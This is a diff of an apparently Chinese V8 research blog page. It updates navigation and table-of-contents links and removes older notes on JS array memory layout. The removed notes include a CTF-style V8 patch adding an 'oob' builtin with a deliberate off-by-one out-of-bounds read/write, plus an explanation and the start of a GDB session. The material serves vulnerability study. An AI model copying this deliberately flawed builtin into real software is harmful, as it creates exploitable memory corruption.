@@ -12,8 +12,10 @@
         <meta name="author" content="SXY">
       
       
+        <link rel="canonical" href="https://jamezx32.github.io/v8/V8%20%E6%95%B0%E7%BB%84%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">
       
-        <link rel="prev" href="../jit/">
+      
+        <link rel="prev" href="../V8%E8%B0%83%E8%AF%95%E6%89%8B%E5%86%8C/">
       
       
         <link rel="next" href="../V8%E5%A0%86%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">
@@ -45,15 +47,9 @@
     
     
       
-        
-        
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
-      
     
     
-      <link rel="stylesheet" href="../../stylesheets/extra.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=2026-04-27-v43">
     
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -71,7 +67,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo">
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -80,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#jsarray" class="md-skip">
           跳转至
         </a>
       
@@ -126,20 +122,20 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
     
-      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_1" hidden>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
       </label>
     
   
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
     
-      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_0" hidden>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
       </label>
     
   
@@ -485,6 +481,34 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../V8%E8%B0%83%E8%AF%95%E6%89%8B%E5%86%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    V8调试手册
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -493,8 +517,6 @@
       
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
-      
-        
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
@@ -538,8 +560,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -548,10 +568,65 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#let-arr11-22-33-44" class="md-nav__link">
+  <a href="#jsarray" class="md-nav__link">
     <span class="md-ellipsis">
       
-        定义方式：let arr=[1.1, 2.2, 3.3, 4.4];
+        JSArray 先看哪几块
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#map-elements-kind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Map 和 elements kind
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fixeddoublearray-fixedarray" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FixedDoubleArray 和 FixedArray
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#elements-kind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        elements kind 的变化
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常用对应表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        参考资料
       
     </span>
   </a>
@@ -610,6 +685,90 @@
     
   
     V8 指针压缩机制
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE-2021-30517%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2021-30517分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE-2025-13224%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2025-13224分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CVE-2025-12433%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE-2025-12433分析
   
 
     
@@ -712,6 +871,90 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../jsc/JavaScriptCore%20Root%20Cause%E5%88%86%E6%9E%90%E8%A6%81%E7%82%B9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Root Cause分析要点
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../jsc/JavaScriptCore%20NAN-Boxing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NAN-Boxing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../jsc/JavaScriptCore%E8%B0%83%E8%AF%95%E5%8F%82%E6%95%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    调试参数
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -788,6 +1031,34 @@
     
   
     总览
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../chakracore/ChakraCore%E6%9E%84%E5%BB%BA%E4%B8%8E%E8%B0%83%E8%AF%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ChakraCore 构建与调试
   
 
     
@@ -942,8 +1213,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -952,10 +1221,65 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#let-arr11-22-33-44" class="md-nav__link">
+  <a href="#jsarray" class="md-nav__link">
     <span class="md-ellipsis">
       
-        定义方式：let arr=[1.1, 2.2, 3.3, 4.4];
+        JSArray 先看哪几块
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#map-elements-kind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Map 和 elements kind
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fixeddoublearray-fixedarray" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FixedDoubleArray 和 FixedArray
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#elements-kind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        elements kind 的变化
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常用对应表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        参考资料
       
     </span>
   </a>
@@ -979,406 +1303,78 @@
 
 
 
-<h1 id="_1">浮点型数组<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
-<h3 id="let-arr11-22-33-44">定义方式：let arr=[1.1, 2.2, 3.3, 4.4];<a class="headerlink" href="#let-arr11-22-33-44" title="Permanent link">&para;</a></h3>
-<p>js数组也可以使用属性的形式访问: 例如arr.a=1; 这个属性a在PropertyArray中的propertyN中存储。</p>
-<p><img alt="image-20250717170233146" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170233146.png" /></p>
-<h1 id="_2">对象型数组<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
-<h3 id="let-arrx1y2">定义方式：let arr=[{x:1},{y:2}];<a class="headerlink" href="#let-arrx1y2" title="Permanent link">&para;</a></h3>
-<p><img alt="image-20250717170240208" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170240208.png" /></p>
-<h1 id="js">js对象<a class="headerlink" href="#js" title="Permanent link">&para;</a></h1>
-<h3 id="let-v">定义方式：let v={};<a class="headerlink" href="#let-v" title="Permanent link">&para;</a></h3>
-<p>js对象也可以使用下标的形式访问: v[0]=1; 这个会在FixedArray中的element[0]处存储</p>
-<p><img alt="image-20250717170248140" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170248140.png" /></p>
-<h3 id="_3">总结部分<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<ol>
-<li>
-<p>JS 数组可以用属性方式访问</p>
-</li>
-<li>
-<p>同时js对象 也可以用数组的形式访问</p>
-</li>
-</ol>
-<p><img alt="image-20250717170456114" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170456114.png" /></p>
-<p>​   在创建JS对象的时候 会预先分配一定大小 此时对于该对象进行添加属性的操作 会判断预分配空间是否足够 如果空间足够则直接存储到预分配空间 (也就是内部属性 ) 否则会存储到外部属性中 此时又有两种方式分别是 慢速属性和快速属性 </p>
-<p>​   快速属性 -&gt; 线性属性存储区 如下图所示</p>
-<p><img alt="image-20250717170541213" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170541213.png" /></p>
-<p>慢速属性 -&gt; 哈希表的方式存储 如下图所示</p>
-<p>​                       <img alt="image-20250717171056406" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717171056406.png" /></p>
-<h3 id="oobpatch">OOB对应的patch<a class="headerlink" href="#oobpatch" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="gh">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="gh">index b027d36..ef1002f 100644</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="gd">--- a/src/bootstrapper.cc</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="gi">+++ b/src/bootstrapper.cc</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="gu">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w"> </span>                          Builtins::kArrayPrototypeCopyWithin, 2, false);
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w"> </span>    SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w"> </span>                          Builtins::kArrayPrototypeFill, 1, false);
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="gi">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="gi">+                          Builtins::kArrayOob,2,false);</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w"> </span>    SimpleInstallFunction(isolate_, proto, &quot;find&quot;,
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w"> </span>                          Builtins::kArrayPrototypeFind, 1, false);
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w"> </span>    SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="gh">index 8df340e..9b828ab 100644</span>
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="gd">--- a/src/builtins/builtins-array.cc</span>
-<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="gi">+++ b/src/builtins/builtins-array.cc</span>
-<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="gu">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span>
-<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w"> </span>  return *final_length;
-<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w"> </span>}
-<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w"> </span>}  // namespace
-<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="gi">+BUILTIN(ArrayOob){</span>
-<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="gi">+    uint32_t len = args.length();</span>
-<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="gi">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span>
-<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="gi">+    Handle&lt;JSReceiver&gt; receiver;</span>
-<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="gi">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
-<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="gi">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span>
-<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="gi">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span>
-<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="gi">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span>
-<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="gi">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span>
-<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="gi">+    if(len == 1){</span>
-<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="gi">+        //read</span>
-<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="gi">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span>
-<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="gi">+    }else{</span>
-<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="gi">+        //write</span>
-<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="gi">+        Handle&lt;Object&gt; value;</span>
-<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="gi">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
-<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="gi">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span>
-<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="gi">+        elements.set(length,value-&gt;Number());</span>
-<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="gi">+        return ReadOnlyRoots(isolate).undefined_value();</span>
-<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="gi">+    }</span>
-<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="gi">+}</span>
-<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>
-<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="w"> </span>BUILTIN(ArrayPush) {
-<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="w"> </span>  HandleScope scope(isolate);
-<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span>
-<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="gh">index 0447230..f113a81 100644</span>
-<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="gd">--- a/src/builtins/builtins-definitions.h</span>
-<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="gi">+++ b/src/builtins/builtins-definitions.h</span>
-<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="gu">@@ -368,6 +368,7 @@ namespace internal {</span>
-<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="w"> </span>  TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
-<a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="w"> </span>  /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
-<a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="w"> </span>  TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
-<a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="gi">+  CPP(ArrayOob)                                                                \</span>
-<a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="w"> </span>                                                                               \
-<a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a><span class="w"> </span>  /* ArrayBuffer */                                                            \
-<a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a><span class="w"> </span>  /* ES #sec-arraybuffer-constructor */                                        \
-<a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a><span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span>
-<a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a><span class="gh">index ed1e4a5..c199e3a 100644</span>
-<a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a><span class="gd">--- a/src/compiler/typer.cc</span>
-<a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a><span class="gi">+++ b/src/compiler/typer.cc</span>
-<a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a><span class="gu">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {</span>
-<a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a><span class="w"> </span>      return Type::Receiver();
-<a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a><span class="w"> </span>    case Builtins::kArrayUnshift:
-<a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span class="w"> </span>      return t-&gt;cache_-&gt;kPositiveSafeInteger;
-<a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a><span class="gi">+    case Builtins::kArrayOob:</span>
-<a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a><span class="gi">+      return Type::Receiver();</span>
-<a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>
-<a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a><span class="w"> </span>    // ArrayBuffer functions.
-<a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a><span class="w"> </span>    case Builtins::kArrayBufferIsView:
-</code></pre></div>
-<p>查看添加到的 <code>src/builtins/builtins-array.cc</code> 代码并尝试发现漏洞。即使没有任何进一步的背景信息，它也应该很容易发现。</p>
-<ul>
-<li>该函数最初将检查参数数是否大于 2（第一个参数始终是 <code>this</code> 参数）。如果是，则返回 undefined。</li>
-<li>如果只有一个参数 （<code>this</code>），它会将数组转换为 <code>FixedDoubleArray</code>，然后返回 <code>array[length]</code> 的元素。</li>
-<li>如果有两个参数（<code>this</code> 和 <code>value</code>），它会将 <code>value</code> 作为浮点数写入 <code>array[length]。</code></li>
-</ul>
-<p>现在，由于数组以索引 0 开头，因此很明显 <code>array[length]</code> 会导致数组末尾的一个索引进行越界访问。</p>
-<p><strong>检查 GDB 中的任何地址都需要你在检查之前从地址中减去 1（以掩盖最后一位）。</strong></p>
-<h2 id="_4">数组末尾之后存在什么？<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
-<p>相反，让我们利用这样一个事实，即我们可以构建 <code>d8</code> 的调试版本并通过调试器运行它，以实时查看数组的内存布局。请注意，您必须使用 <code>./d8 --allow-natives-syntax</code> 运行 <code>d8</code> 才能访问某些调试函数，例如 <code>%DebugPrint（）。</code></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pwn@ubuntu:~/v8/v8/out.gn/x64.debug$<span class="w"> </span>gdb<span class="w"> </span>./d8
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>GEF<span class="w"> </span><span class="k">for</span><span class="w"> </span>linux<span class="w"> </span>ready,<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="sb">`</span>gef<span class="s1">&#39; to start, `gef config&#39;</span><span class="w"> </span>to<span class="w"> </span>configure
-<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="m">77</span><span class="w"> </span>commands<span class="w"> </span>loaded<span class="w"> </span><span class="k">for</span><span class="w"> </span>GDB<span class="w"> </span><span class="m">8</span>.1.0.20180409-git<span class="w"> </span>using<span class="w"> </span>Python<span class="w"> </span>engine<span class="w"> </span><span class="m">3</span>.6
-<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">3</span><span class="w"> </span>commands<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>loaded,<span class="w"> </span>run<span class="w"> </span><span class="sb">`</span>gef<span class="w"> </span>missing<span class="sb">`</span><span class="w"> </span>to<span class="w"> </span>know<span class="w"> </span>why.
-<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Reading<span class="w"> </span>symbols<span class="w"> </span>from<span class="w"> </span>./d8...done.
-<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>gef➤<span class="w">  </span>run<span class="w"> </span>--allow-natives-syntax
-<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Starting<span class="w"> </span>program:<span class="w"> </span>/home/pwn/v8/v8/out.gn/x64.debug/d8<span class="w"> </span>--allow-natives-syntax
-<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="o">[</span>Thread<span class="w"> </span>debugging<span class="w"> </span>using<span class="w"> </span>libthread_db<span class="w"> </span>enabled<span class="o">]</span>
-<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Using<span class="w"> </span>host<span class="w"> </span>libthread_db<span class="w"> </span>library<span class="w"> </span><span class="s2">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.
-<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="o">[</span>New<span class="w"> </span>Thread<span class="w"> </span>0x7ffff30ec700<span class="w"> </span><span class="o">(</span>LWP<span class="w"> </span><span class="m">12183</span><span class="o">)]</span>
